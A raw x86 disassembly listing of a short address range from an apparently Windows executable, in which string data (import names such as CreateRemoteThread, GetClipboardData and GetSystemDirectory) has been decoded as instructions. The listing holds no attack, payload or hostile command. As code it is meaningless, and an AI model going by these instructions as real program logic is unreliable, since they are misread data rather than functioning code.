  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
